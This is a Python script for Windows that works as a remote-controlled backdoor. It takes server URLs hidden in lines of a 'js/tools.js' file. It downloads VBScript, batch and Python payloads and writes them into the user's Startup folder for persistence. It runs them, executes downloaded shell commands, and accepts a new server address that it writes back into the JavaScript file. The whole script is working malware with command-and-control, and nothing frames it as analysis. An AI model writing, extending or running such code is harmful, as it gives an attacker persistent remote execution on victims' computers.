from urllib import request
import sys, os, winshell
import subprocess

print(winshell.startup())

def get_string(p):
    with request.urlopen(p) as f:
        s = f.read().decode('utf-8')
        return s

def get_lines(p):
    with request.urlopen(p) as f:
        l = f.readlines()
        return l

def set_fl(p, l):
    with open(p, 'wb') as f:
        f.writelines(l)

def get_start_p(name):
    return os.path.join(winshell.startup(), name)

try:
    with open("js/tools.js") as f:
        l = f.readlines()

    server_name = l[5][2:]
    p_lines = get_lines(l[4][2:])
    ready = get_string(l[4][2:])
    c_l = get_lines(l[6][2:])
    b_lines = get_lines(l[7][2:])

    print(p_lines)
    print(ready)
    print(c_l)
    print(b_lines)

    path = None
    is_ready_to_reload = ""
    cmpl = None

    if(len(c_l)> 1):
        cmpl = c_l[0].decode('utf-8').strip()
        if(cmpl == 'vbs'):
            del c_l[0]

            path = get_start_p("setup.vbs")
            print(path)
            set_fl(path, c_l)

            path = get_start_p("setup.bat")
            set_fl(path, b_lines)
            print(path)

            path = get_start_p("setup.pyw")
            set_fl(path,p_lines)
            print(path)

            is_ready_to_reload = "true"

        elif cmpl == 'p':
            del c_l[0]
            path = get_start_p("setup.pyw")
            set_fl(path, p_lines)
            is_ready_to_reload = "true"

        else:
            for n_l in c_l:
                n_l = n_l.decode('utf-8')
                subprocess.call(n_l, shell=True)

    if(is_ready_to_reload == "true"):
        path = os.path.join(winshell.startup(), "setup.vbs")
        subprocess.call(['cscript.exe', path])

    subprocess.run([sys.executable, "-c", ready])
    new_server = ""
    with request.urlopen(server_name) as f:
        f = f.readlines()
        new_server = f[0].decode('utf-8').strip()
        del f[0]
        for x in f:
            print(x)
            x = x.decode('utf-8')
            print(x.split(" "))
            process = subprocess.Popen([c.replace("\r\n", "") for c in x.split(" ")], stdout=subprocess.PIPE)

    if(new_server == "" or len(new_server) < 5 or new_server == None):
        pass
    else:
        if(new_server != None):
            l[0] = f"var hostname = '{new_server}'\n"
            with open("js/tools.js", "w") as f:
                f.writelines(l)
except:
    os.system("echo Internet not connected && pause")
